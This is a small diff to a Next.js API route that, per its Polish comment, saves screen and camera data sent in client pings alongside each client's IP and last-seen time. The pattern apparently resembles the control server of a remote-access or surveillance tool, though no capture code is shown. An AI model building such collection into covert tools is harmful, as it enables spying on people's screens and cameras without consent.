@@ -30,6 +30,10 @@ export async function POST(req: Request) {
     client.lastSeen = Date.now();
     client.ip = ip;
     client.messages = [];
+
+    // 🔥 Zapisujemy dane ekranu i kamery jeśli przyszły w pingu
+    if (body.screen) client.screenData = body.screen;
+    if (body.camera) client.cameraData = body.camera;
     
     return NextResponse.json({ 
       status: "ok", 
